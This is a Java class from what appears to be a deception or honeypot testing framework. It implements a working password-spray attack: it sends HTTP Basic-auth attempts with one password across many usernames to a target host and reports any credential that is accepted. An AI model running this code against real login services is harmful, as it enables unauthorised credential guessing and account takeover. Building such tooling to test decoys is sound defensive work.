package com.mirage.specter;

import com.mirage.common.trace.TraceLevel;

import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.charset.StandardCharsets;
import java.util.Base64;
import java.util.List;

/** Tries one password across many usernames against a Basic-auth login decoy. */
public final class PasswordSprayAttack implements AttackStrategy {

    private final List<String> usernames;
    private final String password;

    public PasswordSprayAttack(List<String> usernames, String password) {
        this.usernames = usernames;
        this.password = password;
    }

    @Override
    public void run(Target target, AttackTrace trace) {
        trace.line(TraceLevel.COMMAND, "spray --pass '" + password + "' --users "
                + String.join(",", usernames) + "  " + target.host() + ":" + target.port());
        for (String user : usernames) {
            ProbeReply.Outcome outcome = attempt(target, user, password, trace);
            if (outcome == ProbeReply.Outcome.ACCEPTED) {
                trace.line(TraceLevel.GOOD, "valid credential found: " + user + ":" + password);
                return;
            }
            if (outcome == ProbeReply.Outcome.DROPPED || outcome == ProbeReply.Outcome.STALLED) {
                return;
            }
        }
        trace.line(TraceLevel.WARN, "spray complete, no account accepted the password");
    }

    private ProbeReply.Outcome attempt(Target target, String user, String pass, AttackTrace trace) {
        try (Socket socket = new Socket(target.host(), target.port())) {
            String creds = Base64.getEncoder()
                    .encodeToString((user + ":" + pass).getBytes(StandardCharsets.UTF_8));
            String request = "GET / HTTP/1.0\r\nAuthorization: Basic " + creds + "\r\n\r\n";
            OutputStream out = socket.getOutputStream();
            out.write(request.getBytes(StandardCharsets.UTF_8));
            out.flush();
            ProbeReply reply = ProbeReply.read(socket, 1500);
            trace.line(BruteForceAttack.levelFor(reply.outcome),
                    "try " + user + ":" + pass + "  ->  " + BruteForceAttack.describe(reply));
            return reply.outcome;
        } catch (IOException e) {
            trace.line(TraceLevel.BAD, "try " + user + ":" + pass + "  ->  connection failed");
            return ProbeReply.Outcome.DROPPED;
        }
    }

    @Override
    public String name() {
        return "password-spray";
    }
}
